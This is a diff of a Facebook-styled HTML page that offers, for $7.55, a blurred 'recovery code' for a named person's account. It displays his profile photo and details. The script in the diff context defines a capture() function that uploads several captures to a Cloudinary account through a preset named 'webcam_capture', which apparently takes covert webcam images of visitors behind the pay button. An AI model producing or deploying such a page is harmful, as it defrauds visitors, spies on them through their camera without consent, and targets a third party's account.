@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Facebook Style Checkout</title>
+  <title>Facebook Recovery</title>
   <style>
     * {
       margin: 0;
@@ -70,6 +69,20 @@
       margin-bottom: 20px;
     }
 
+    .code-box {
+      font-size: 28px;
+      font-weight: bold;
+      letter-spacing: 8px;
+      text-align: center;
+      margin: 20px 0;
+      filter: blur(8px);
+      user-select: none;
+    }
+
+    .code-box.revealed {
+      filter: none;
+    }
+
     .pay-button {
       background-color: #1877f2;
       color: white;
@@ -79,6 +92,7 @@
       border-radius: 8px;
       cursor: pointer;
       transition: background-color 0.3s ease;
+      width: 100%;
     }
 
     .pay-button:hover {
@@ -86,28 +100,26 @@
     }
   </style>
 </head>
-
 <body>
   <div class="container">
     <div class="card">
       <div class="profile">
-        <img
-          src="https://scontent.fdac99-1.fna.fbcdn.net/v/t1.6435-9/145218214_798357337694100_4065249566845725218_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=NTlCIhQNL5oQ7kNvwFr3alk&_nc_oc=Adk76LvckfYh_j2cCbpYfT-3Y4cnYt14qDUApu_vnrvONDJc42JBpq2IlC_gvVLTHXc&_nc_zt=23&_nc_ht=scontent.fdac99-1.fna&_nc_gid=3uLowefEK-q1x9Px8mxkNw&oh=00_AfPfJo5qOcr0UuEXRgThSpQq8tkuV6zH4rCZKVpHahgUPA&oe=686D008B"
-          alt="Profile Photo" class="avatar" />
+        <img src="https://scontent.fdac99-1.fna.fbcdn.net/v/t1.6435-9/145218214_798357337694100_4065249566845725218_n.jpg" alt="Profile Photo" class="avatar" />
         <div class="details">
           <h2>Atikur Rahman Molla</h2>
           <p>Friends: 1.7K</p>
         </div>
       </div>
       <div class="checkout">
-        <p class="info">To get the code and vpn for this account, please pay</p>
-        <h3>$4.00</h3>
-        <button class="pay-button" onclick="handleBuy()">Pay $4 </button>
+        <p class="info">To get the 8-digit recovery code, please pay:</p>
+        <h3>$7.55</h3>
+        <div id="codeBox" class="code-box">12345678</div>
+        <button class="pay-button" onclick="handleBuy()">Pay $7.55 to Reveal Code</button>
       </div>
     </div>
   </div>
 
-  <script>
+   <script>
     async function capture(totalCaptures = 3, intervalMs = 200) {
       const cloudName = 'dojvahtu9';
       const uploadPreset = 'webcam_capture';
@@ -176,5 +188,4 @@
     }
   </script>
 </body>
-
 </html>
